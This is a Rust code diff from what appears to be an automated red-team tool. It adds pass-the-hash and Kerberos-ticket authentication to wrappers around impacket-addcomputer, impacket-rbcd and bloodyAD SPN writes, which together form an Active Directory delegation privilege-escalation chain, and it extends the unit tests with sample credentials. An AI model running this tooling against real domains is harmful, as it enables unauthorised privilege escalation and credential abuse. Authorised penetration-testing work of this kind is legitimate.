@@ -121,84 +121,174 @@ pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
+/// Apply the shared auth precedence to an impacket command whose identity is a
+/// bare `domain/username[:password]` string with no `@target` suffix
+/// (`addcomputer`, `rbcd` — unlike `secretsdump`/`wmiexec`, which append the
+/// host and are served by [`credentials::impacket_target`]).
+///
+/// Precedence: `ticket_path` > NTLM hash (`hash`/`nt_hash`/`ntlm_hash`) >
+/// `password`. The identity carries `:password` ONLY on the password branch —
+/// appending it under hash or ccache auth makes impacket prefer the cleartext
+/// bind and discard the pass-the-hash/Kerberos material entirely.
+fn impacket_identity_auth(
+    cmd: CommandBuilder,
+    args: &Value,
+    domain: &str,
+    username: &str,
+) -> Result<CommandBuilder> {
+    let identity = format!("{domain}/{username}");
+
+    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
+        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
+        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
+        return Ok(cmd
+            .arg(identity)
+            .arg("-k")
+            .arg("-no-pass")
+            .env(ccname_key, ccname_val)
+            .env(cfg_key, cfg_val));
+    }
+
+    if let Some(raw) = credentials::ntlm_hash_arg(args) {
+        return Ok(cmd
+            .arg(identity)
+            .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
+            .arg("-no-pass"));
+    }
+
+    let password = optional_str(args, "password")
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
+    Ok(cmd.arg(format!("{identity}:{password}")))
+}
+
 /// Add a computer account to the domain using impacket-addcomputer.
 ///
-/// Required args: `domain`, `username`, `password`, `computer_name`, `dc_ip`
+/// Required args: `domain`, `username`, `computer_name`, `dc_ip`
 /// (`computer_password` required only for the default add action).
-/// Optional args: `action` (`add` [default] | `delete`). `delete` removes the
-///                named computer — used by operation teardown to drop a machine
-///                account this op created.
+/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
+/// [`impacket_identity_auth`]:
+///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`); also
+///     needs `dc_host`, since addcomputer.py raises "Kerberos auth requires
+///     DNS name of the target DC. Use -dc-host." before it ever connects
+///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
+///   - `password` — plaintext, folded into the identity string
+///
+/// Optional args: `action` (`add` [default] | `delete`), `dc_host`. `delete`
+///                removes the named computer — used by operation teardown to
+///                drop a machine account this op created.
 pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
+    build_add_computer(args)?.execute().await
+}
+
+/// Build the `impacket-addcomputer` command.
+///
+/// Split out from [`add_computer`] so unit tests can assert on the constructed
+/// argument vector (via `args_for_test`) without spawning the binary.
+#[doc(hidden)]
+pub fn build_add_computer(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let computer_name = required_str(args, "computer_name")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let action = optional_str(args, "action").unwrap_or("add");
+    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());
 
-    let target = format!("{domain}/{username}:{password}");
+    if optional_str(args, "ticket_path").is_some_and(|s| !s.is_empty()) && dc_host.is_none() {
+        anyhow::bail!(
+            "add_computer with a Kerberos ccache also needs `dc_host` (the DC's DNS \
+             name) — impacket-addcomputer rejects `-k` without `-dc-host`"
+        );
+    }
 
-    let mut cmd = CommandBuilder::new("impacket-addcomputer")
-        .arg(target)
-        .flag("-computer-name", computer_name)
-        .flag("-dc-ip", dc_ip);
+    let mut cmd = impacket_identity_auth(
+        CommandBuilder::new("impacket-addcomputer"),
+        args,
+        domain,
+        username,
+    )?
+    .flag("-computer-name", computer_name)
+    .flag("-dc-ip", dc_ip)
+    .flag_opt("-dc-host", dc_host);
+
     if matches!(action, "delete" | "del" | "remove") {
         cmd = cmd.arg("-delete");
     } else {
         cmd = cmd.flag("-computer-pass", required_str(args, "computer_password")?);
     }
-    cmd.timeout_secs(120).execute().await
+    Ok(cmd.timeout_secs(120))
 }
 
 /// Add or remove an SPN on a target account using bloodyAD.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `action`,
-///                `target_account`, `spn`
+/// Required args: `domain`, `dc_ip`, `action`, `target_account`, `spn`
+/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
+/// [`credentials::bloodyad_base`]:
+///   - `ticket_path` (Kerberos ccache; bloodyAD `-k ccache=<path>`)
+///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
+///   - `username` + `password` (plaintext NTLM bind)
 pub async fn addspn(args: &Value) -> Result<ToolOutput> {
+    build_addspn(args)?.execute().await
+}
+
+/// Build the `bloodyAD … spn` command.
+///
+/// Split out from [`addspn`] so unit tests can assert on the constructed
+/// argument vector (via `args_for_test`) without spawning the binary.
+#[doc(hidden)]
+pub fn build_addspn(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let action = required_str(args, "action")?;
     let target_account = required_str(args, "target_account")?;
     let spn = required_str(args, "spn")?;
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg(action)
         .arg("spn")
         .arg(target_account)
         .arg(spn)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120))
 }
 
 /// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
 ///
-/// Required args: `domain`, `username`, `password`, `target_computer`,
-///                `attacker_sid`, `dc_ip`
+/// Required args: `domain`, `username`, `target_computer`, `attacker_sid`,
+///                `dc_ip`
+/// Auth — one of (precedence: `ticket_path` > `hash` > `password`), see
+/// [`impacket_identity_auth`]:
+///   - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`)
+///   - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
+///   - `password` — plaintext, folded into the identity string
+///
+/// Optional args: `dc_host`. rbcd.py resolves the LDAP target from `-dc-host`
+/// when set and otherwise falls back to an anonymous SMB lookup of the DC's
+/// machine name, which a hardened DC refuses.
 pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
+    build_rbcd_write(args)?.execute().await
+}
+
+/// Build the `impacket-rbcd` command.
+///
+/// Split out from [`rbcd_write`] so unit tests can assert on the constructed
+/// argument vector (via `args_for_test`) without spawning the binary.
+#[doc(hidden)]
+pub fn build_rbcd_write(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let target_computer = required_str(args, "target_computer")?;
     let attacker_sid = required_str(args, "attacker_sid")?;
     let dc_ip = required_str(args, "dc_ip")?;
+    let dc_host = optional_str(args, "dc_host").filter(|s| !s.is_empty());
 
-    let target = format!("{domain}/{username}:{password}");
-
-    CommandBuilder::new("impacket-rbcd")
+    let cmd = CommandBuilder::new("impacket-rbcd")
         .flag("-delegate-to", target_computer)
         .flag("-delegate-from", attacker_sid)
         .flag("-action", "write")
         .flag("-dc-ip", dc_ip)
-        .arg(target)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .flag_opt("-dc-host", dc_host);
+
+    Ok(impacket_identity_auth(cmd, args, domain, username)?.timeout_secs(120))
 }
 
 /// Run KrbRelayUp for local privilege escalation via Kerberos relay.
@@ -547,23 +637,18 @@ mod tests {
     fn add_computer_all_required_args() {
         let args = json!({
             "domain": "contoso.local",
-            "username": "jsmith",
+            "username": "alice",
             "password": "P@ssw0rd!",
-            "computer_name": "EVIL$",
+            "computer_name": "svc_rbcd$",
             "computer_password": "CompP@ss123!",
             "dc_ip": "192.168.58.10"
         });
-        assert_eq!(required_str(&args, "computer_name").unwrap(), "EVIL$");
-        assert_eq!(
-            required_str(&args, "computer_password").unwrap(),
-            "CompP@ss123!"
-        );
-        // Verify the target string format
-        let domain = required_str(&args, "domain").unwrap();
-        let username = required_str(&args, "username").unwrap();
-        let password = required_str(&args, "password").unwrap();
-        let target = format!("{domain}/{username}:{password}");
-        assert_eq!(target, "contoso.local/jsmith:P@ssw0rd!");
+        let cmd = super::build_add_computer(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "contoso.local/alice:P@ssw0rd!"));
+        assert_eq!(flag_value(argv, "-computer-name"), Some("svc_rbcd$"));
+        assert_eq!(flag_value(argv, "-computer-pass"), Some("CompP@ss123!"));
+        assert_eq!(flag_value(argv, "-dc-ip"), Some("192.168.58.10"));
     }
 
     #[test]
@@ -589,12 +674,16 @@ mod tests {
             "target_account": "svc_sql",
             "spn": "MSSQLSvc/sql01.contoso.local:1433"
         });
-        assert_eq!(required_str(&args, "action").unwrap(), "add");
-        assert_eq!(required_str(&args, "target_account").unwrap(), "svc_sql");
-        assert_eq!(
-            required_str(&args, "spn").unwrap(),
-            "MSSQLSvc/sql01.contoso.local:1433"
-        );
+        let cmd = super::build_addspn(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(flag_value(argv, "-p"), Some("P@ssw0rd!"));
+        assert_eq!(flag_value(argv, "--host"), Some("192.168.58.10"));
+        assert!(argv.iter().any(|a| a == "add"));
+        assert!(argv.iter().any(|a| a == "spn"));
+        assert!(argv.iter().any(|a| a == "svc_sql"));
+        assert!(argv
+            .iter()
+            .any(|a| a == "MSSQLSvc/sql01.contoso.local:1433"));
     }
 
     #[test]
@@ -620,17 +709,15 @@ mod tests {
             "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
             "dc_ip": "192.168.58.10"
         });
-        assert_eq!(required_str(&args, "target_computer").unwrap(), "dc01$");
+        let cmd = super::build_rbcd_write(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "contoso.local/admin:P@ssw0rd!"));
+        assert_eq!(flag_value(argv, "-delegate-to"), Some("dc01$"));
         assert_eq!(
-            required_str(&args, "attacker_sid").unwrap(),
-            "S-1-5-21-1234567890-987654321-1122334455-1234"
+            flag_value(argv, "-delegate-from"),
+            Some("S-1-5-21-1234567890-987654321-1122334455-1234")
         );
-        // Verify target format
-        let domain = required_str(&args, "domain").unwrap();
-        let username = required_str(&args, "username").unwrap();
-        let password = required_str(&args, "password").unwrap();
-        let target = format!("{domain}/{username}:{password}");
-        assert_eq!(target, "contoso.local/admin:P@ssw0rd!");
+        assert_eq!(flag_value(argv, "-action"), Some("write"));
     }
 
     #[test]
@@ -867,5 +954,366 @@ mod tests {
             "create_password": "Ev1lP@ss!"
         });
         assert!(krbrelayup(&args).await.is_ok());
+    }
+
+    // ── hash / ticket auth for the GenericAll→RBCD chain ────────────────
+
+    const NT: &str = "0123456789abcdef0123456789abcdef";
+    const LM: &str = "fedcba9876543210fedcba9876543210";
+    const EMPTY_LM: &str = "aad3b435b51404eeaad3b435b51404ee";
+    const CCACHE: &str = "/tmp/ares-tickets/alice.ccache";
+
+    /// Value that follows `flag` in the built argv, if present.
+    fn flag_value<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
+        let idx = argv.iter().position(|a| a == flag)?;
+        argv.get(idx + 1).map(String::as_str)
+    }
+
+    fn with_arg(base: &Value, key: &str, value: &str) -> Value {
+        let mut args = base.clone();
+        args.as_object_mut()
+            .unwrap()
+            .insert(key.to_string(), Value::String(value.to_string()));
+        args
+    }
+
+    fn add_computer_base() -> Value {
+        json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "computer_name": "svc_rbcd$",
+            "computer_password": "CompP@ss123!",
+            "dc_ip": "192.168.58.10"
+        })
+    }
+
+    fn rbcd_write_base() -> Value {
+        json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "target_computer": "dc01$",
+            "attacker_sid": "S-1-5-21-1234567890-987654321-1122334455-1234",
+            "dc_ip": "192.168.58.10"
+        })
+    }
+
+    fn addspn_base() -> Value {
+        json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "dc_ip": "192.168.58.10",
+            "action": "add",
+            "target_account": "svc_sql",
+            "spn": "MSSQLSvc/sql01.contoso.local:1433"
+        })
+    }
+
+    type Builder = fn(&Value) -> Result<CommandBuilder>;
+
+    /// The impacket-backed chain steps, whose identity string is a bare
+    /// `domain/username[:password]` with no `@host` suffix.
+    fn impacket_chain_cases() -> Vec<(&'static str, Value, Builder)> {
+        vec![
+            (
+                "add_computer",
+                with_arg(&add_computer_base(), "dc_host", "dc01.contoso.local"),
+                super::build_add_computer as Builder,
+            ),
+            (
+                "rbcd_write",
+                rbcd_write_base(),
+                super::build_rbcd_write as Builder,
+            ),
+        ]
+    }
+
+    /// Every step of the GenericAll→RBCD chain, impacket- and bloodyAD-backed.
+    fn chain_cases() -> Vec<(&'static str, Value, Builder)> {
+        let mut cases = impacket_chain_cases();
+        cases.push(("addspn", addspn_base(), super::build_addspn as Builder));
+        cases
+    }
+
+    #[test]
+    fn chain_accepts_hash_only_auth() {
+        for (name, base, build) in chain_cases() {
+            let cmd = build(&with_arg(&base, "hash", NT))
+                .unwrap_or_else(|e| panic!("{name} must build from a hash alone: {e}"));
+            let argv = cmd.args_for_test();
+            assert!(
+                argv.iter().any(|a| a.contains(&format!("{EMPTY_LM}:{NT}"))),
+                "{name} must carry the normalized LM:NT pair: {argv:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn chain_accepts_ticket_only_auth() {
+        for (name, base, build) in chain_cases() {
+            let cmd = build(&with_arg(&base, "ticket_path", CCACHE))
+                .unwrap_or_else(|e| panic!("{name} must build from a ccache alone: {e}"));
+            assert!(
+                cmd.args_for_test().iter().any(|a| a == "-k"),
+                "{name} must select the Kerberos branch"
+            );
+            assert!(
+                cmd.env_vars_for_test()
+                    .iter()
+                    .any(|(k, v)| k == "KRB5CCNAME" && v == CCACHE),
+                "{name} must export KRB5CCNAME"
+            );
+        }
+    }
+
+    #[test]
+    fn chain_accepts_password_only_auth() {
+        for (name, base, build) in chain_cases() {
+            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!"))
+                .unwrap_or_else(|e| panic!("{name} must build from a password alone: {e}"));
+            let argv = cmd.args_for_test();
+            assert!(argv.iter().all(|a| a != "-k"), "{name}");
+            assert!(argv.iter().all(|a| a != "-hashes"), "{name}");
+        }
+    }
+
+    #[test]
+    fn chain_without_auth_material_errors_naming_every_form() {
+        for (name, base, build) in chain_cases() {
+            let Err(err) = build(&base) else {
+                panic!("{name} must refuse to dispatch without any auth material");
+            };
+            let err = err.to_string();
+            for form in ["ticket_path", "hash", "nt_hash", "ntlm_hash", "password"] {
+                assert!(
+                    err.contains(form),
+                    "{name} error must name the `{form}` auth form; got: {err}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn impacket_chain_identity_carries_no_password_under_hash_or_ticket() {
+        for (name, base, build) in impacket_chain_cases() {
+            for key in ["hash", "ticket_path"] {
+                let value = if key == "hash" { NT } else { CCACHE };
+                let args = with_arg(&with_arg(&base, key, value), "password", "P@ssw0rd!");
+                let cmd = build(&args).unwrap();
+                let argv = cmd.args_for_test();
+                assert!(
+                    argv.iter().any(|a| a == "contoso.local/alice"),
+                    "{name} ({key}) must send the bare domain/user identity: {argv:?}"
+                );
+                assert!(
+                    argv.iter().all(|a| !a.contains("P@ssw0rd!")),
+                    "{name} ({key}) leaked the password into the argv: {argv:?}"
+                );
+                assert!(argv.iter().any(|a| a == "-no-pass"), "{name} ({key})");
+            }
+        }
+    }
+
+    #[test]
+    fn impacket_chain_password_identity_has_the_password_suffix() {
+        for (name, base, build) in impacket_chain_cases() {
+            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!")).unwrap();
+            assert!(
+                cmd.args_for_test()
+                    .iter()
+                    .any(|a| a == "contoso.local/alice:P@ssw0rd!"),
+                "{name} must fold the password into the identity string"
+            );
+        }
+    }
+
+    #[test]
+    fn impacket_chain_hash_normalization() {
+        let expected_empty_lm = format!("{EMPTY_LM}:{NT}");
+        let cases: Vec<(&str, String, String)> = vec![
+            ("hash", NT.to_string(), expected_empty_lm.clone()),
+            ("hash", format!("{LM}:{NT}"), format!("{LM}:{NT}")),
+            ("hash", format!(":{NT}"), expected_empty_lm.clone()),
+            ("hash", format!("  {NT}  "), expected_empty_lm.clone()),
+            ("nt_hash", NT.to_string(), expected_empty_lm.clone()),
+            ("ntlm_hash", NT.to_string(), expected_empty_lm),
+        ];
+        for (name, base, build) in impacket_chain_cases() {
+            for (key, raw, expected) in &cases {
+                let cmd = build(&with_arg(&base, key, raw)).unwrap();
+                assert_eq!(
+                    flag_value(cmd.args_for_test(), "-hashes"),
+                    Some(expected.as_str()),
+                    "{name}: {key}={raw} must reach impacket as -hashes LMHASH:NTHASH"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn chain_rejects_malformed_hash() {
+        for (name, base, build) in chain_cases() {
+            for raw in [
+                "not-a-hash",
+                "0123456789abcdef",
+                "0123456789abcdef0123456789abcde",
+                "0123456789abcdef0123456789abcdefa",
+                "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
+                "nolm:0123456789abcdef0123456789abcde",
+                "0123456789abcdef0123456789abcdef:short",
+            ] {
+                let Err(err) = build(&with_arg(&base, "hash", raw)) else {
+                    panic!("{name}: malformed hash {raw:?} must not reach the subprocess");
+                };
+                assert!(
+                    err.to_string().contains("malformed NTLM hash"),
+                    "{name}: expected a malformed-hash error for {raw:?}, got: {err}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn chain_auth_precedence_is_ticket_then_hash_then_password() {
+        for (name, base, build) in chain_cases() {
+            let all_three = with_arg(
+                &with_arg(&with_arg(&base, "password", "P@ssw0rd!"), "hash", NT),
+                "ticket_path",
+                CCACHE,
+            );
+            let cmd = build(&all_three).unwrap();
+            assert!(
+                cmd.args_for_test().iter().all(|a| a != "-hashes"),
+                "{name}: ticket_path must suppress the hash branch"
+            );
+            assert!(
+                cmd.env_vars_for_test()
+                    .iter()
+                    .any(|(k, _)| k == "KRB5CCNAME"),
+                "{name}: ticket_path must win"
+            );
+
+            let hash_and_password = with_arg(&with_arg(&base, "hash", NT), "password", "P@ssw0rd!");
+            let cmd = build(&hash_and_password).unwrap();
+            assert!(
+                cmd.args_for_test().iter().all(|a| !a.contains("P@ssw0rd!")),
+                "{name}: hash must win over password"
+            );
+        }
+    }
+
+    #[test]
+    fn chain_empty_hash_falls_back_to_password() {
+        for (name, base, build) in chain_cases() {
+            let args = with_arg(&with_arg(&base, "hash", ""), "password", "P@ssw0rd!");
+            let cmd = build(&args)
+                .unwrap_or_else(|e| panic!("{name} must fall through an empty hash: {e}"));
+            assert!(
+                cmd.args_for_test().iter().all(|a| a != "-hashes"),
+                "{name}: an empty hash must not select the pass-the-hash branch"
+            );
+        }
+    }
+
+    #[test]
+    fn add_computer_kerberos_requires_dc_host() {
+        let args = with_arg(&add_computer_base(), "ticket_path", CCACHE);
+        let Err(err) = super::build_add_computer(&args) else {
+            panic!("addcomputer.py rejects -k without -dc-host; the wrapper must too");
+        };
+        assert!(err.to_string().contains("dc_host"), "{err}");
+
+        let args = with_arg(&args, "dc_host", "dc01.contoso.local");
+        let cmd = super::build_add_computer(&args).unwrap();
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "-dc-host"),
+            Some("dc01.contoso.local")
+        );
+    }
+
+    #[test]
+    fn add_computer_delete_action_keeps_hash_auth() {
+        let args = with_arg(
+            &with_arg(&add_computer_base(), "hash", NT),
+            "action",
+            "delete",
+        );
+        let cmd = super::build_add_computer(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "-delete"));
+        assert!(argv.iter().all(|a| a != "-computer-pass"));
+        assert_eq!(
+            flag_value(argv, "-hashes"),
+            Some(format!("{EMPTY_LM}:{NT}").as_str())
+        );
+    }
+
+    #[test]
+    fn add_computer_delete_action_needs_no_computer_password() {
+        let mut args = add_computer_base();
+        args.as_object_mut().unwrap().remove("computer_password");
+        let args = with_arg(
+            &with_arg(&args, "password", "P@ssw0rd!"),
+            "action",
+            "delete",
+        );
+        assert!(super::build_add_computer(&args).is_ok());
+    }
+
+    #[test]
+    fn addspn_hash_auth_uses_bloodyad_password_flag() {
+        let cmd = super::build_addspn(&with_arg(&addspn_base(), "hash", NT)).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-p"),
+            Some(format!("{EMPTY_LM}:{NT}").as_str())
+        );
+        assert_eq!(flag_value(argv, "-u"), Some("alice"));
+        assert_eq!(flag_value(argv, "-d"), Some("contoso.local"));
+    }
+
+    #[test]
+    fn addspn_ticket_auth_uses_ccache_keyword_form() {
+        let cmd = super::build_addspn(&with_arg(&addspn_base(), "ticket_path", CCACHE)).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| *a == format!("ccache={CCACHE}")));
+        assert!(
+            argv.iter().all(|a| a != "-p"),
+            "ticket_path must suppress both -p forms: {argv:?}"
+        );
+    }
+
+    #[test]
+    fn rbcd_write_passes_dc_host_when_supplied() {
+        let args = with_arg(
+            &with_arg(&rbcd_write_base(), "hash", NT),
+            "dc_host",
+            "dc01.contoso.local",
+        );
+        let cmd = super::build_rbcd_write(&args).unwrap();
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "-dc-host"),
+            Some("dc01.contoso.local")
+        );
+    }
+
+    #[tokio::test]
+    async fn add_computer_with_hash_executes() {
+        mock::push(mock::success());
+        let args = with_arg(&add_computer_base(), "hash", NT);
+        assert!(add_computer(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn rbcd_write_with_hash_executes() {
+        mock::push(mock::success());
+        let args = with_arg(&rbcd_write_base(), "hash", NT);
+        assert!(rbcd_write(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn addspn_with_hash_executes() {
+        mock::push(mock::success());
+        let args = with_arg(&addspn_base(), "hash", NT);
+        assert!(addspn(&args).await.is_ok());
     }
 }
